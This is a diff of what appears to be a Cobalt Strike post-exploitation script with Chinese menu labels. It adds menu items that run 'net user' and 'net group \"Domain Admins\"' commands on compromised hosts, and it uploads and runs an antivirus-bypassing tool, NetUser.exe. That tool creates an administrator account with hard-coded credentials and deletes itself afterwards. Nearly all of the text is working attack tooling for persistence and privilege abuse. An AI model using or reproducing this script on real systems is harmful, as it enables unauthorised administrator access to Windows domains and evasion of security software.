@@ -38,24 +38,30 @@ menu "添加用户" {
     bshell($bid, "net user $Name $Pwd /add /domain && net group \"Domain Admins\" $Name /add /domain");
   }
 
-  menu "add-admin(bypass)"{
-    item "上传add-admin"{
+
+#  item "api添加管理员用户" {
+#    $bid = $1['@'];
+#    btask($bid, "用户名：qxa，密码：Qianxin@123.", "");
+#    bexecute($bid, "/scripts/Add user/bof_net_user.o");
+#  }
+
+  menu "bypass创建管理员用户"{
+    item "上传NetUser"{
       local('$bid');
       foreach $bid ($1){
-        bupload($1, script_resource("/scripts/Add user/add-admin.exe"));
-        blog($1, "项目地址：https://github.com/lengjibo/RedTeamTools/blob/master/windows/bypass360%E5%8A%A0%E7%94%A8%E6%88%B7/README.md")
+        bupload($1, script_resource("/scripts/Add user/NetUser.exe"));
+        blog($1, "项目地址：https://github.com/lengjibo/NetUser")
       }
     }
-    item "运行add-admin" {
+    item "运行NetUser" {
       $bid = $1['@'];
-      $dialog = dialog("add-admin", %(bid => $bid), &add_admin);
-      dialog_description($dialog, "执行后自动添加一个账户进入管理员组，并自动删除程序。帐号：hacker 密码：P@ssw0rd，添加完成后及时修改账号名，过于招摇。");
+      $dialog = dialog("NetUser", %(bid => $bid), &NetUser);
+      dialog_description($dialog, "执行后自动添加一个账户进入管理员组，并自动删除程序。帐号：test123 密码：Test@#123");
       dbutton_action($dialog, "运行");
       dialog_show($dialog);
     }
-    sub add_admin{
-      bshell($bid, "add-admin.exe");
-      bshell($bid, "del /f /s /q add-admin.exe");
+    sub NetUser{
+      bshell($bid, "NetUser.exe");
     }
   }
 
